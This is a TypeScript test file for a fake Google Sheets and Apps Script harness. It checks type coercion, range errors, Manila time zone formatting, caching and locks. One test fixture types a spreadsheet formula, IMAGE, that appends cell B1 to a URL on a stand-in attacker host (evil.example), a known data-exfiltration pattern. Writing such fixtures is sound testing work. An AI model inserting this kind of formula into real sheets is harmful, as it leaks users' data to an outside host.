/**
 * The harness, held to the services it stands in for. A fake kinder than
 * Google hides the bugs the other tests are here to find, so each rule below
 * is one Code.gs has tripped on, or could.
 */

import { describe, expect, it } from 'vitest';
import { asTyped, show } from './fake-sheets';
import {
  collisions,
  formatDate,
  HarnessError,
  loadProject,
  manila,
  PROJECT_FILES,
  readServerFile,
  type Project,
} from './harness';

/** A project with one spreadsheet "s" holding one tab "T". */
function withSheet(options: { readonly rows?: number } = {}) {
  const project = loadProject();
  const tab = project.sheets.create('s').addSheet('T', [], options);
  return { project, tab };
}

/** Runs `body` in the script, with `sh` bound to tab T. */
function inScript(project: Project, body: string): unknown {
  return project.evaluate(`(function () { var sh = SpreadsheetApp.openById('s').getSheetByName('T'); ${body} })()`);
}

describe('the project loads as Apps Script loads it', () => {
  it('declares no top-level name in two files, since all three share one global scope', () => {
    const files = PROJECT_FILES.map((file) => ({ file, text: readServerFile(file) }));

    expect(collisions(files)).toEqual([]);
  });

  it('refuses a project where two files declare the same name', () => {
    const load = () =>
      loadProject({ patch: (file, src) => (file === 'BuildDirectory.gs' ? `${src}\nfunction route(req) {}\n` : src) });

    expect(load).toThrow(HarnessError);
    expect(load).toThrow(/route \(Code\.gs and BuildDirectory\.gs\)/);
  });

  it('runs Code.gs and Separators.gs in one scope: the splitter is a plain global', () => {
    const project = loadProject();

    expect(project.evaluate('typeof splitAtSeparator_')).toBe('function');
    expect(project.evaluate(`splitAtSeparator_(${JSON.stringify('For sale\n---\nOwner 0917')}).posting`)).toBe('For sale');
  });

  it('says which file and line will not load', () => {
    const load = () =>
      loadProject({ patch: (file, src) => (file === 'Code.gs' ? src.replace('function now() {', 'function now() { var = 1;') : src) });

    expect(load).toThrow(/Code\.gs:\d+/);
  });
});

describe('Sheets, as strict as Sheets', () => {
  it('reads text written to an automatic cell as typing', () => {
    expect(show(asTyped('14:30'))).toBe('#time 14:30');
    expect(show(asTyped('2:05 PM'))).toBe('#time 14:05');
    expect(show(asTyped('1201'))).toBe('#number 1201');
    expect(show(asTyped('09171234567'))).toBe('#number 9171234567');
    expect(show(asTyped('2026-03-09'))).toBe('#date 2026-03-09');
    expect(show(asTyped('3/9/2026'))).toBe('#date 2026-03-09');
    expect(show(asTyped('TRUE'))).toBe('#boolean TRUE');
    expect(show(asTyped('=1+1'))).toBe('#formula =1+1');
    expect(show(asTyped('+63 917 123 4567'))).toBe('#formula +63 917 123 4567');
    expect(show(asTyped('- 3 bedrooms'))).toBe('#formula - 3 bedrooms');
    expect(show(asTyped("'0917"))).toBe('0917');
    expect(show(asTyped('0917 123 4567'))).toBe('0917 123 4567');
    expect(show(asTyped('2026-02-30'))).toBe('2026-02-30');
  });

  it('keeps "14:30" as written once the cell is plain text, and only then', () => {
    const { project, tab } = withSheet();
    inScript(
      project,
      `sh.getRange(1, 1).setValue('14:30');
       sh.getRange(1, 2).setNumberFormat('@');
       sh.getRange(1, 2).setValue('14:30');
       sh.getRange(2, 2).setNumberFormat('@');
       sh.appendRow(['14:30', '14:30', '1201', '=A1']);`,
    );

    expect(tab.row(1)).toEqual(['#time 14:30', '14:30', '', '']);
    expect(tab.row(2)).toEqual(['#time 14:30', '14:30', '#number 1201', '#formula =A1']);
    expect(tab.formats(2)).toEqual(['', '@', '', '']);
  });

  it('hands a time back as a Date of the script on Sheets\' day zero', () => {
    const { project, tab } = withSheet();
    tab.type(['14:30']);

    expect(
      inScript(
        project,
        `var v = sh.getRange(1, 1).getValue();
         return [v instanceof Date, Utilities.formatDate(v, 'Asia/Manila', 'yyyy-MM-dd'), Utilities.formatDate(v, 'Asia/Manila', 'HH:mm')];`,
      ),
    ).toEqual([true, '1899-12-30', '14:30']);
  });

  it('reads an evaluated formula back as its error, not its text', () => {
    const { project, tab } = withSheet();
    tab.type(['=IMAGE("https://evil.example/?"&B1)']);

    expect(inScript(project, 'return sh.getRange(1, 1).getValue();')).toBe('#ERROR!');
  });

  it('refuses a range outside the grid: appendRow grows it, getRange does not', () => {
    const { project, tab } = withSheet({ rows: 2 });
    tab.type(['a'], ['b']);

    expect(() => inScript(project, "sh.getRange(3, 1).setValue('c');")).toThrow(/outside the dimensions of the sheet/);
    inScript(project, "sh.appendRow(['c']);");
    expect(tab.maxRows).toBe(3);
    expect(tab.show()).toEqual([['a'], ['b'], ['c']]);
  });

  it('wants exactly the shape of the range from setValues', () => {
    const { project } = withSheet();

    expect(() => inScript(project, "sh.getRange(1, 1, 1, 2).setValues([['a']]);")).toThrow(/number of columns in the data/);
    expect(() => inScript(project, "sh.getRange(1, 1, 2, 1).setValues([['a']]);")).toThrow(/number of rows in the data/);
  });

  it('refuses to write undefined, which Code.gs must spell ""', () => {
    const { project } = withSheet();

    expect(() => inScript(project, 'sh.appendRow([undefined]);')).toThrow(/wrote undefined/);
  });

  it('gives the first tab of every spreadsheet sheet id 0, as Sheets does', () => {
    const project = loadProject();
    const first = project.sheets.create('a').addSheet('One');
    const other = project.sheets.create('b').addSheet('Two');

    expect([first.gid, other.gid]).toEqual([0, 0]);
    expect(project.sheets.book('a').addSheet('Three').gid).not.toBe(0);
  });

  it('refuses to delete the last row that is not frozen', () => {
    const { project, tab } = withSheet({ rows: 2 });
    tab.type(['Header'], ['only row']);
    inScript(project, 'sh.setFrozenRows(1);');

    expect(() => inScript(project, 'sh.deleteRow(2);')).toThrow(/not possible to delete all non-frozen rows/);
  });

  it('opens a spreadsheet by id only if it exists, and has no active one for a standalone script', () => {
    const project = loadProject();

    expect(() => project.evaluate("SpreadsheetApp.openById('nope')")).toThrow(/openById/);
    expect(project.evaluate('SpreadsheetApp.getActiveSpreadsheet()')).toBeNull();
  });
});

describe('the other services', () => {
  it('formats dates on Manila\'s clock, whatever the machine\'s', () => {
    const at = (iso: string) => new Date(iso);

    expect(formatDate(at('2026-03-08T23:00:00Z'), 'Asia/Manila', 'yyyy-MM-dd HH:mm')).toBe('2026-03-09 07:00');
    expect(formatDate(at('1899-12-30T06:30:00Z'), 'Asia/Manila', 'HH:mm')).toBe('14:30');
    expect(formatDate(at('2026-03-08T23:00:00Z'), 'Asia/Manila', "yyyy-MM-dd'T'HH:mm:ssXXX")).toBe('2026-03-09T07:00:00+08:00');
    expect(formatDate(at('2026-03-08T23:00:00Z'), 'Asia/Manila', 'EEE d MMM')).toBe('Mon 9 Mar');
  });

  it('refuses a zone it does not keep, and a date that is not a Date', () => {
    expect(() => formatDate(new Date(), 'America/New_York', 'HH:mm')).toThrow(HarnessError);
    expect(() => formatDate('2026-03-09', 'Asia/Manila', 'HH:mm')).toThrow(/don't match the method signature/);
  });

  it('gives the script the harness\'s clock', () => {
    const project = loadProject({ now: '2026-03-09 07:00' });

    expect(project.evaluate('Date.now()')).toBe(manila('2026-03-09 07:00'));
    expect(project.evaluate('new Date().getTime()')).toBe(Date.UTC(2026, 2, 8, 23, 0));
    project.clock.advance(60_000);
    expect(project.clock.manila).toBe('2026-03-09 07:01');
    expect(project.evaluate("new Date('2026-03-09').getTime()")).toBe(Date.UTC(2026, 2, 9));
  });

  it('refuses what reads the machine\'s time zone, even inside a try', () => {
    const project = loadProject();

    expect(() => project.evaluate('new Date(2026, 2, 9).getTime()')).toThrow(/time zone/);
    expect(() => project.evaluate("new Date('3/9/2026').getTime()")).toThrow(/time zone/);
    expect(() => project.evaluate('(function () { try { return new Date().getHours(); } catch (e) { return -1; } })()')).toThrow(
      /getHours/,
    );
  });

  it('keeps a cached value for its time and no longer, and refuses one over 100 KB', () => {
    const project = loadProject();
    project.evaluate("CacheService.getScriptCache().put('k', 'v', 60)");

    project.clock.advance(59_000);
    expect(project.evaluate("CacheService.getScriptCache().get('k')")).toBe('v');
    project.clock.advance(1_000);
    expect(project.evaluate("CacheService.getScriptCache().get('k')")).toBeNull();
    expect(() => project.evaluate("CacheService.getScriptCache().put('big', new Array(102402).join('x'), 60)")).toThrow(
      /Argument too large/,
    );
  });

  it('gives the script lock to one execution at a time, and frees it when that execution ends', () => {
    const { project, tab } = withSheet();
    tab.type(['x']);
    const seen: unknown[] = [];
    project.interleave((_what, depth) => {
      if (depth === 1 && seen.length === 0) seen.push(project.evaluate('LockService.getScriptLock().tryLock(20000)'));
    });

    // Takes the lock and never releases it; reads a cell while holding it.
    inScript(project, "LockService.getScriptLock().tryLock(20000); sh.getRange(1, 1).getValue(); return 1;");
    project.interleave(null);

    expect(seen).toEqual([false]);
    expect(project.evaluate('LockService.getScriptLock().tryLock(20000)')).toBe(true);
  });

  it('answers only with ContentService JSON', () => {
    const project = loadProject();

    expect(() => project.evaluate("ContentService.createTextOutput('{}').setMimeType('application/json')")).toThrow(
      /setMimeType/,
    );
  });
});
